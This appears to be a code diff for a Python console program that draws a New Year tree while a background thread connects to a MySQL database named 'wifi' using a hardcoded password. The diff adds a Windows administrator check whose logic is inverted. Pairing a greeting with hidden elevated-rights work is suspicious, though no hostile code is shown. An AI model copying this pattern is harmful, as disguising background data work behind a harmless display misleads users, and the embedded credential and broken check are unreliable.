@@ -7,6 +7,9 @@ import re
 from threading import Thread
 import time
 import mysql.connector
+import os
+from tkinter import messagebox
+import ctypes
 
 COMPLIENCE = {}
 
@@ -57,7 +60,8 @@ def main():
             password='lastpassword',
             database='wifi',
             charset='utf8mb4',
-            collation='utf8mb4_unicode_ci'
+            collation='utf8mb4_unicode_ci',
+            auth_plugin = 'mysql_native_password'
         )
 
         cursor = connect.cursor()
@@ -120,20 +124,33 @@ def create_fir(countRows):
         print(f"{Fore.LIGHTBLACK_EX}{random.choice(symbols)}", end='')
 
 
+def cheking_on_admin():
+    result = ctypes.windll.shell32.IsUserAnAdmin()
+    if result != 0:
+        return False
+    else: return True
+
 if __name__ == '__main__':
-    colorama.init()
+    if cheking_on_admin():
 
-    thread = Thread(target=main)
-    thread.start()
+        colorama.init()
 
-    countRows = get_number()
-    create_fir(countRows)
+        thread = Thread(target=main)
+        thread.start()
 
-    thread.join()
-    print(f'\n\n{Fore.CYAN}  С Новым годом!')
+        countRows = get_number()
+        create_fir(countRows)
 
-    while True:
-        time.sleep(60)
+        thread.join()
+        print(f'\n\n{Fore.CYAN}  С Новым годом!')
+
+        while True:
+            time.sleep(60)
+    else:
+        messageBox = messagebox
+        messageBox.showinfo('Windows', 'Необходимы права администратора.')
+
+
 
 
 
